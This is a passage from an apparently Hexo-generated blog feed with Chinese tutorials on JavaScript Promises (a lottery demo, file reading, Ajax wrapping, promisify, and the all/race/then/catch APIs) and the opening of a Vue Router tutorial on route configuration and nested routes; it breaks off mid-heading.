class="line">&#125;)</span><br></pre></td></tr></table></figure><p>（2）：解决方案？</p><p>promise的链式调用</p><h2 id="3-Promise的小应用"><a href="#3-Promise的小应用" class="headerlink" title="3.Promise的小应用"></a>3.Promise的小应用</h2><h3 id="3-1-一个小小的抽奖程序"><a href="#3-1-一个小小的抽奖程序" class="headerlink" title="3.1.一个小小的抽奖程序"></a>3.1.一个小小的抽奖程序</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">//rand生成随机数</span><br><span class="line">function rand(m, n) &#123;</span><br><span class="line">    return Math.ceil(Math.random() * (n - m + 1) + m - 1)</span><br><span class="line">&#125;</span><br><span class="line">const btn = document.querySelector(&quot;#btn&quot;)</span><br><span class="line">// 绑定点击事件</span><br><span class="line">btn.addEventListener(&#x27;click&#x27;, function () &#123;</span><br><span class="line">    // console.log(&quot;hello promise&quot;)</span><br><span class="line">    //创建一个promise的实例对象</span><br><span class="line">    //resolve代表解决 函数类型对象</span><br><span class="line">    //reject代表拒绝 函数类型对象</span><br><span class="line">    const p = new Promise((resolve, reject) =&gt; &#123;</span><br><span class="line">        setTimeout(() =&gt; &#123;</span><br><span class="line">            let n = rand(1, 100)</span><br><span class="line">            //进入判断</span><br><span class="line">            if(n &lt;= 50)&#123;</span><br><span class="line">                resolve()//将promise对象的状态设置为-成功</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                reject()//将promise队形的状态设置为-失败</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,1000);</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    //调用then方法</span><br><span class="line">    p.then(() =&gt;&#123;//resolve调用</span><br><span class="line">        alert(&#x27;恭喜中奖&#x27;)</span><br><span class="line">    &#125;,()=&gt;&#123;//reject调用</span><br><span class="line">        alert(&#x27;再接再厉&#x27;);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>1.Promise的实例对象需要创建，其中包含了我们的异步任务</p><p>2.Promise实例化后用过then方法运行，实现触发回调</p><p>但是如果我们想知道自己的中奖号码是多少怎么办呢？</p><p>还记得resolve和reject这两个函数吗？我们就用这两个函数传参</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if (n &lt;= 50) &#123;</span><br><span class="line">    resolve(n)//将promise对象的状态设置为-成功</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    reject(n)//将promise队形的状态设置为-失败</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p.then((value) =&gt; &#123;//resolve调用，参数叫value--成功的值</span><br><span class="line">    alert(&#x27;恭喜中奖,号码为&#x27; + value)</span><br><span class="line">&#125;, (reason) =&gt; &#123;//reject调用，参数叫reason--失败的原因</span><br><span class="line">    alert(&#x27;再接再厉&#x27; + reason);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="3-2-读取文件"><a href="#3-2-读取文件" class="headerlink" title="3.2.读取文件"></a>3.2.读取文件</h3><p>在原生js中我们读取文件的方式是使用fs模块</p><p>原生：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//引入fs模块</span><br><span class="line">const fs = require(&#x27;fs&#x27;);</span><br><span class="line"></span><br><span class="line">fs.readFile(&#x27;./resource/content.txt&#x27;,(err,data)=&gt;&#123;</span><br><span class="line">    //出错</span><br><span class="line">    if(err) throw err;</span><br><span class="line">    //输出文件</span><br><span class="line">    console.log(data.toString())</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>同样，这样子的异步问题，我们依然可以使用Promise解决</p><p>Promise：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">const fs = require(&#x27;fs&#x27;);</span><br><span class="line"></span><br><span class="line">let p = new Promise((resolve , reject)=&gt;&#123;</span><br><span class="line">    fs.readFile(&#x27;./resource/content.txt&#x27;,(err,data)=&gt;&#123;</span><br><span class="line">        //出错</span><br><span class="line">        if(err) reject(err)</span><br><span class="line">        //成功回调</span><br><span class="line">        resolve(data)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">//调用then</span><br><span class="line">p.then(value=&gt;&#123;</span><br><span class="line">    console.log(value.toString())//不加toString那么得到的就会是数字码</span><br><span class="line">&#125;,reason=&gt;&#123;</span><br><span class="line">    console.log(reason)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="3-3-发送Ajax请求"><a href="#3-3-发送Ajax请求" class="headerlink" title="3.3.发送Ajax请求"></a>3.3.发送Ajax请求</h3><p>现在问题来到了Ajax身上，Ajax同样也是一个异步操作，我们用Promise进行封装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">const p = new Promise((reslove, reject) =&gt; &#123;</span><br><span class="line">    btn.addEventListener(&#x27;click&#x27;, function () &#123;</span><br><span class="line">        const xhr = new XMLHttpRequest()</span><br><span class="line">        xhr.open(&#x27;GET&#x27;, &#x27;https://api.apiopen.top/getJoke&#x27;)</span><br><span class="line">        xhr.send()</span><br><span class="line">        //处理结果</span><br><span class="line">        xhr.onreadystatechange = function () &#123;</span><br><span class="line">            if (xhr.readyState === 4) &#123;</span><br><span class="line">                if (xhr.status &gt;= 200 &amp;&amp; xhr.status &lt; 300) &#123;</span><br><span class="line">                    reslove(xhr.response)</span><br><span class="line">                &#125;else&#123;</span><br><span class="line">                    reject(xhr.status)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>以后会有axios给我们使用，axios就是promise风格的发送Ajax请求的方法</p><h3 id="3-4-自动封装函数Promisify"><a href="#3-4-自动封装函数Promisify" class="headerlink" title="3.4.自动封装函数Promisify"></a>3.4.自动封装函数Promisify</h3><p>如果对函数进行promise封装每次都要我们手写，那实在是十分不妥</p><p>接下来我们引入 util 模块中的promisify方法，帮助我们实现自动封装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//引入util</span><br><span class="line">const util = require(&#x27;util&#x27;)</span><br><span class="line">//引入fs</span><br><span class="line">const fs = require(&#x27;fs&#x27;)</span><br><span class="line">//返回一个新函数,将readFile封装成promise风格</span><br><span class="line">let readMyFile = util.promisify(fs.readFile)</span><br><span class="line"></span><br><span class="line">readMyFile(&#x27;./resource/content.txt&#x27;).then(value =&gt; &#123;</span><br><span class="line">    console.log(value.toString());</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>非常好用！</p><h3 id="3-5-promise对象的状态"><a href="#3-5-promise对象的状态" class="headerlink" title="3.5.promise对象的状态"></a>3.5.promise对象的状态</h3><p>Promise实例对象中会有一个状态属性——PromiseState</p><p>这个属性有三个可能值：1.pending（未决定的）2.resolved/fullfilled（正确状态）3.rejected（错误状态）</p><p>这些属性之间的转换：只能是由padding转化为resolved或者rejected</p><p>通过resolve，reject，throw改变状态</p><h3 id="3-6-promise对象的结果"><a href="#3-6-promise对象的结果" class="headerlink" title="3.6.promise对象的结果"></a>3.6.promise对象的结果</h3><p>Promise实例对象中会有一个结果属性——PromiseResult</p><p>这个属性存着Promise对象的结果</p><p>改变这个结果只能通过resolve和reject两个方法进行改变</p><h2 id="4-Promise的API"><a href="#4-Promise的API" class="headerlink" title="4.Promise的API"></a>4.Promise的API</h2><h3 id="4-1-execator和catch"><a href="#4-1-execator和catch" class="headerlink" title="4.1.execator和catch"></a>4.1.execator和catch</h3><p>execator代表我们(resolve,reject) =&gt; {} 中的内容，它和我们的const p 是同步调用的，也就是这里面的代码是会立即执行的</p><p>catch是Promise对象的对于失败的回调，类似于我们的then ，但是它只管理失败回调</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    let p = new Promise((resolve,reject)=&gt;&#123;</span><br><span class="line">        console.log(&#x27;111&#x27;);</span><br><span class="line">        reject(&#x27;error&#x27;)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    console.log(222);</span><br><span class="line">    p.catch(reason =&gt; &#123;</span><br><span class="line">        console.log(reason);</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>这里的输出顺序是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">111</span><br><span class="line">222</span><br><span class="line">error</span><br></pre></td></tr></table></figure><h3 id="4-2-resolve"><a href="#4-2-resolve" class="headerlink" title="4.2 resolve"></a>4.2 resolve</h3><p>resolve是一个Promise下的方案，使用<code>Promise.reslove()</code>调用与以往new Promise的调用不同</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//传入的参数是一个非Promise的值,得到一个fulfilled的Promise对象</span><br><span class="line">let p = Promise.resolve(521)</span><br><span class="line">console.log(p)</span><br><span class="line">//传入参数是一个Promise对象，得到和传入Promise对象相同的Promise对象</span><br><span class="line">let q = Promise.resolve(new Promise((resolve,reject)=&gt;&#123;</span><br><span class="line">    reject(&quot;err&quot;)</span><br><span class="line">&#125;))</span><br><span class="line">//消除报错</span><br><span class="line">q.catch(reason =&gt; &#123;</span><br><span class="line">    console.log(reason);</span><br><span class="line">&#125;)</span><br><span class="line">//这里是rejected状态的Promise对象</span><br><span class="line">console.log(q)</span><br></pre></td></tr></table></figure><p>唯一需要注意的是传入的参数为Promise对象时的情况</p><h3 id="4-3-rejecte"><a href="#4-3-rejecte" class="headerlink" title="4.3 rejecte"></a>4.3 rejecte</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">let r = Promise.reject(521)</span><br><span class="line">let j = Promise.reject(new Promise((resolve,reject)=&gt;&#123;</span><br><span class="line">    resolve(&quot;OK&quot;)</span><br><span class="line">&#125;))</span><br><span class="line">//返回的Promise对象依然失败，失败的原因是我们传入的Promise对象</span><br><span class="line">console.log(j);</span><br></pre></td></tr></table></figure><p>与resolve不同的是，即使给reject传入一个成功的Promise对象，所返回的Promise对象状态依然是rejected</p><h3 id="4-4-all"><a href="#4-4-all" class="headerlink" title="4.4 all"></a>4.4 all</h3><p>当我们有多个Promise对象的时候，使用我们的all方案</p><p>all方法参数可以是一个Promise数组，只要数组中有一个失败Promise那么返回的Promise就会失败，多个失败结果只会返回第一个查找到的失败结果值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">let p1 = new Promise((resolve, reject) =&gt; &#123;</span><br><span class="line">    resolve(&quot;ok&quot;)</span><br><span class="line">&#125;)</span><br><span class="line">let p2 = Promise.resolve(&quot;right&quot;)</span><br><span class="line">let p3 = Promise.reject(&quot;err&quot;)</span><br><span class="line">const all = Promise.all([p1, p2, p3])</span><br><span class="line">console.log(all);</span><br></pre></td></tr></table></figure><p>得到的结果是一个原因为<code>err</code>，状态为<code>rejected</code>的Promise对象</p><h3 id="4-5-race"><a href="#4-5-race" class="headerlink" title="4.5 race"></a>4.5 race</h3><p>也是传入一个数组作为参数，返回第一个改变状态的Promise对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">let r1 = new Promise((resolve, reject) =&gt; &#123;</span><br><span class="line">    setTimeout(() =&gt; &#123;</span><br><span class="line">        resolve(&quot;ok&quot;)  </span><br><span class="line">    &#125;, 1000);</span><br><span class="line">&#125;)</span><br><span class="line">let r2 = Promise.resolve(&quot;right&quot;)</span><br><span class="line">let r3 = Promise.reject(&quot;err&quot;)</span><br><span class="line">//返回第一个改变结果的Promise对象-r2</span><br><span class="line">const race = Promise.race([r1,r2,r3])</span><br><span class="line">console.log(race);</span><br></pre></td></tr></table></figure><p>这里因为r1延迟resolve了，所以race中第一个改变的对象是r2</p><h3 id="4-6-then方法的返回结果"><a href="#4-6-then方法的返回结果" class="headerlink" title="4.6 then方法的返回结果"></a>4.6 then方法的返回结果</h3><p>then方法的返回结果是一个Promise对象，对象的PromiseState和PromiseResult与传入的参数有关</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">let p = new Promise((resolve,reject)=&gt;&#123;</span><br><span class="line">    resolve(&#x27;OK&#x27;)</span><br><span class="line">&#125;)</span><br><span class="line">let result = p.then(value =&gt; &#123;</span><br><span class="line">    //第一种返回throw  得到错误对象</span><br><span class="line">    // throw &quot;err&quot;</span><br><span class="line">    //第二次返回非Promise对象 得到成功对象</span><br><span class="line">    // return 521</span><br><span class="line">    //第三次返回Promise对象 得到Promise状态和原因</span><br><span class="line">    return  new Promise((resolve,reject) =&gt;&#123;</span><br><span class="line">        resolve(&quot;right&quot;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;,</span><br><span class="line">reason =&gt; &#123;</span><br><span class="line"></span><br><span class="line">&#125;) </span><br><span class="line">console.log(result);</span><br></pre></td></tr></table></figure><h3 id="4-7-Promise串联任务"><a href="#4-7-Promise串联任务" class="headerlink" title="4.7 Promise串联任务"></a>4.7 Promise串联任务</h3><p>使用then的链式调用串联任务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">let p = new Promise((resolve,reject)=&gt;&#123;</span><br><span class="line">    resolve(&#x27;OK&#x27;)</span><br><span class="line">&#125;)</span><br><span class="line">let result = p.then(value =&gt; &#123;</span><br><span class="line">    //第一种返回throw  得到错误对象</span><br><span class="line">    // throw &quot;err&quot;</span><br><span class="line">    //第二次返回非Promise对象 得到成功对象</span><br><span class="line">    // return 521</span><br><span class="line">    //第三次返回Promise对象 得到Promise状态和原因</span><br><span class="line">    return  new Promise((resolve,reject) =&gt;&#123;</span><br><span class="line">        resolve(&quot;right&quot;)</span><br><span class="line">    &#125;).then(value =&gt; &#123;</span><br><span class="line">        console.log(value);</span><br><span class="line">    &#125;).then(value =&gt; &#123;</span><br><span class="line">        console.log(value);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;,</span><br><span class="line">reason =&gt; &#123;</span><br><span class="line"></span><br><span class="line">&#125;) </span><br><span class="line">console.log(result);//得到一个state为fulfilled，result为undefined的对象</span><br></pre></td></tr></table></figure><h3 id="4-8-异常穿透"><a href="#4-8-异常穿透" class="headerlink" title="4.8 异常穿透"></a>4.8 异常穿透</h3><p>在串联任务中我们不需要每个then都指定失败的回调</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">let p = new Promise((resolve, reject) =&gt; &#123;</span><br><span class="line">    reject(&#x27;err&#x27;)</span><br><span class="line">&#125;) </span><br><span class="line">p.then(value =&gt; &#123;</span><br><span class="line">    console.log(111);</span><br><span class="line">&#125;).then(value =&gt;&#123;</span><br><span class="line">    console.log(222);</span><br><span class="line">&#125;).then(value =&gt;&#123;</span><br><span class="line">    console.log(333);</span><br><span class="line">&#125;).catch(reason =&gt;&#123;</span><br><span class="line">    console.log(reason);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>只要发生了异常，就会触发catch的失败回调</p><h3 id="4-9-中断链式"><a href="#4-9-中断链式" class="headerlink" title="4.9 中断链式"></a>4.9 中断链式</h3><p>中断链式需要then方法返回一个pending状态的promise对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">let p = new Promise((resolve, reject) =&gt; &#123;</span><br><span class="line">     resolve(&#x27;err&#x27;)</span><br><span class="line"> &#125;) </span><br><span class="line"> p.then(value =&gt; &#123;</span><br><span class="line">     console.log(111);</span><br><span class="line">     //返回一个pending类型的promise对象时中断链式</span><br><span class="line">     return new Promise(() =&gt;&#123;&#125;)</span><br><span class="line"> &#125;).then(value =&gt;&#123;</span><br><span class="line">     console.log(222);</span><br><span class="line"> &#125;).then(value =&gt;&#123;</span><br><span class="line">     console.log(333);</span><br><span class="line"> &#125;).catch(reason =&gt;&#123;</span><br><span class="line">     console.log(reason);</span><br><span class="line"> &#125;)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Promise</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Route</title>
    <link href="/2022/05/19/%E8%B7%AF%E7%94%B1/"/>
    <url>/2022/05/19/%E8%B7%AF%E7%94%B1/</url>
    
    <content type="html"><![CDATA[<h1 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h1><h2 id="1-什么是路由"><a href="#1-什么是路由" class="headerlink" title="1. 什么是路由"></a>1. 什么是路由</h2><p>简单定义：1.route（路由）是<strong>一组key-value的对应关系</strong>（key是组件，value是组件或者函数《后端路由-node.js》）</p><p>​                  2.多个路由<strong>需要经过router（路由器）的管理</strong></p><p>路由就是为了实现SPA（single page web application）应用—单页面应用</p><p>我们转换页面时，<strong>只进行局部的更新，不刷新，同时改变路径</strong></p><p> <strong>vue-router是vue的一个插件库，通过Vue.use()使用</strong></p><p><img src="https://s2.loli.net/2022/06/20/XIyfN5ovzVMTPgb.png" alt="路由图示.png"></p><p>我们的路由就是一组组的对应关系，不同的路径，路由规则，展示不同的组件</p><h2 id="2-路由的基本使用"><a href="#2-路由的基本使用" class="headerlink" title="2.路由的基本使用"></a>2.路由的基本使用</h2><p>路由所实现的就是一个单页面应用的组件切换效果，那在使用前我们需要先安装router</p><h3 id="1-router的安装和基本配置"><a href="#1-router的安装和基本配置" class="headerlink" title="1.router的安装和基本配置"></a>1.router的安装和基本配置</h3><p>在控制台中输入：<code>npm i vue-router</code>(如果你是vue3，那么安装默认的4版本就好了)</p><p>如果你是vue2 就需要安装3版本 :<code>npm i vue-router@3</code></p><p>然后和其他插件一样，我们在main.js中引入，并使用–Vue.use()，然后加入vm配置项中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import Vue from &#x27;vue&#x27;</span><br><span class="line">import App from &#x27;./App.vue&#x27;</span><br><span class="line">//引入路由</span><br><span class="line">import VueRouter from &quot;vue-router&quot;;</span><br><span class="line">//引入路由器</span><br><span class="line">import router from &#x27;./router&#x27;</span><br><span class="line"></span><br><span class="line">Vue.config.productionTip = false</span><br><span class="line">Vue.use(VueRouter)</span><br><span class="line"></span><br><span class="line">new Vue(&#123;</span><br><span class="line">    el: &#x27;#app&#x27;,</span><br><span class="line">    render: h =&gt; h(App),</span><br><span class="line">    router:  router</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>和vuex一样，router也需要一个js文件来写逻辑，我们在src下新建一个文件夹（router）写入文件（index.js）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">//引入组件和路由</span><br><span class="line">import About from &#x27;../components/About&#x27;</span><br><span class="line">import Home from &#x27;../components/Home&#x27;</span><br><span class="line">import vueRouter from &#x27;vue-router&#x27;</span><br><span class="line"></span><br><span class="line">export default new vueRouter(&#123;</span><br><span class="line">    routes: [//配置我们一组组的key-value关系</span><br><span class="line">        &#123;</span><br><span class="line">            path: &#x27;/about&#x27;,//切换的路径</span><br><span class="line">            component: About//对应的组件</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            path: &#x27;/home&#x27;,</span><br><span class="line">            component: Home</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="2-router的使用"><a href="#2-router的使用" class="headerlink" title="2.router的使用"></a>2.router的使用</h3><p>我们准备两个组件Home和About，展示的内容便是需要切换的部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;h2&gt;我是About的内容&lt;/h2&gt;//Home中就是 我是Home中的内容</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure><p>然后回到app组件，我们介绍路由对应的两个新标签</p><p>1.当我们需要切换页面时，按照以往的操作，应该配置一个<code>a</code>标签，而在路由中我们使用<code>router-link</code>和<code>to</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 现在我们使用router-link 和 to 实现路由的切换--&gt;</span><br><span class="line">&lt;router-link class=&quot;list-group-item&quot; active-class=&quot;active&quot; to=&quot;about&quot;&gt;About&lt;/router-link&gt;</span><br><span class="line">&lt;!-- 由路由实现高亮active效果 active-class --&gt;</span><br><span class="line">&lt;router-link class=&quot;list-group-item&quot; active-class=&quot;active&quot; to=&quot;home&quot;&gt;Home&lt;/router-link&gt;</span><br></pre></td></tr></table></figure><p>2.我们需要展示的内容就使用<code>router-view</code> 替代占位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;panel-body&quot;&gt;</span><br><span class="line">  &lt;!-- 展示组件看用户的导航项 --&gt;</span><br><span class="line">  &lt;router-view&gt;&lt;/router-view&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>OK！基本效果完成</p><h3 id="3-几个注意点"><a href="#3-几个注意点" class="headerlink" title="3.几个注意点"></a>3.几个注意点</h3><p>1.路由组件通常存放在pages文件夹，一般组件通常存放在components文件夹</p><p>2.通过切换，隐藏了的路由组件，默认是被销毁（destroy）的，需要的时候再去挂载。</p><p>3.每个组件都有自己的<code>$route</code>属性，里面存储着自己的路由信息。</p><p>4.整个应用只有一个router，可以通过组件的<code>$router</code>属性获取到</p><h2 id="3-嵌套（多级）路由"><a href="#3-嵌套（多级）路由" class="headerlink" title="3.嵌套（多级）路由"></a>3.嵌套（多级）路由</h2><p>但是我们在工程中的时候，常常是一个组件切换后还有一个组件切换——所以我们拥有了多级路由</p><p>有什么不一样？</p><p>多级路由无非就是一个路径的问题，例如我们这里home下还有一个路由</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    path: &#x27;/home&#x27;,</span><br><span class="line">    component: Home,</span><br><span class="line">    children: [//配置children属性，实现多级路由</span><br><span class="line">        &#123;</span><br><span class="line">            path: &#x27;news&#x27;,</span><br><span class="line">            component: News,</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            path: &#x27;message&#x27;,</span><br><span class="line">            component: Message,</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就是home下<code>router-link</code>的路径——也需要写出完整路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//home 组件中写入</span><br><span class="line">&lt;ul class=&quot;nav nav-tabs&quot;&gt;</span><br><span class="line">   &lt;li&gt;</span><br><span class="line">     &lt;router-link class=&quot;list-group-item&quot; active-class=&quot;active&quot; to=&quot;/home/news&quot;&gt;News&lt;/router-link&gt;</span><br><span class="line">   &lt;/li&gt;</span><br><span class="line">   &lt;li&gt;</span><br><span class="line">     &lt;router-link class=&quot;list-group-item&quot; active-class=&quot;active&quot; to=&quot;/home/message&quot;&gt;Message&lt;/router-link&gt;</span><br><span class="line">   &lt;/li&gt;</span><br><span class="line"> &lt;/ul&gt;</span><br></pre></td></tr></table></figure><p>最后在需要展示的位置<code>router-view</code>就好了！</p><h2 id="4-路由的query参数"><a href="#4-路由的query参数" class="headerlink" 